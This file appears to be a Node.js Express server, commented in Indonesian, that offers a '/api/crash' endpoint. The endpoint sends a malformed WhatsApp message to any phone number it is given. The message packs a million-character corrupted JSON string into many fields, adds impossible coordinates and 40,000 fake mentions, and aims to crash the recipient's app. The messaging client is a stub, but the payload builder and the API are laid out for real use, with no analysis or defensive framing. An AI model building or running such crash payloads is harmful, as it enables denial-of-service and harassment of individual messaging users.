const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

// Dummy WhatsApp client (ganti dengan implementasi asli)
const sock = {
  relayMessage: async (jid, message, options) => {
    console.log(`Relay message to ${jid} with options:`, options);
    // Simulasi delay
    return new Promise(resolve => setTimeout(resolve, 500));
  }
};

// Fungsi mengirim payload corrupt ke target tanpa sender
async function KontolInvis(target) {
  const corruptedJson = "{".repeat(1000000);

  const payload = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: corruptedJson,
            hasMediaAttachment: false,
            locationMessage: {
              degreesLatitude: -999.035,
              degreesLongitude: 922.999999999999,
              name: corruptedJson,
              address: corruptedJson
            }
          },
          body: { text: corruptedJson },
          footer: { text: corruptedJson },
          nativeFlowMessage: {
            messageParamsJson: corruptedJson
          },
          contextInfo: {
            forwardingScore: 9999,
            isForwarded: true,
            mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
          }
        }
      }
    },
    buttonsMessage: {
      contentText: corruptedJson,
      footerText: corruptedJson,
      buttons: [
        {
          buttonId: "btn_invis",
          buttonText: { displayText: corruptedJson },
          type: 1
        }
      ],
      headerType: 1
    },
    extendedTextMessage: {
      text: corruptedJson,
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
      }
    },
    documentMessage: {
      fileName: corruptedJson,
      title: corruptedJson,
      mimetype: "application/x-corrupt",
      fileLength: "999999999",
      caption: corruptedJson,
      contextInfo: {}
    },
    stickerMessage: {
      isAnimated: true,
      fileSha256: Buffer.from(corruptedJson).toString("base64"),
      mimetype: "image/webp",
      fileLength: 9999999,
      fileEncSha256: Buffer.from(corruptedJson).toString("base64"),
      mediaKey: Buffer.from(corruptedJson).toString("base64"),
      directPath: corruptedJson,
      mediaKeyTimestamp: Date.now(),
      isAvatar: false
    }
  };

  await sock.relayMessage(target + "@s.whatsapp.net", payload, {
    messageId: null,
    participant: { jid: target + "@s.whatsapp.net" },
    userJid: target + "@s.whatsapp.net"
  });

  console.log("BUG BERHASIL DIKIRIM ke " + target);
}

// Endpoint API crash
app.post("/api/crash", async (req, res) => {
  const { target, bugType, durationHours = 1 } = req.body;

  if (!target || !target.match(/^\d+$/)) {
    return res.status(400).json({ success: false, message: "Target number is required and must be digits only." });
  }

  try {
    switch (bugType) {
      case "CrashInfinity":
        await KontolInvis(target);
        break;
      // Tambahkan case lain jika ada fungsi bug lain
      default:
        await KontolInvis(target);
    }

    res.json({ success: true, message: `Bug ${bugType || "default"} terkirim ke ${target}` });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: "Gagal kirim bug", error: err.message });
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));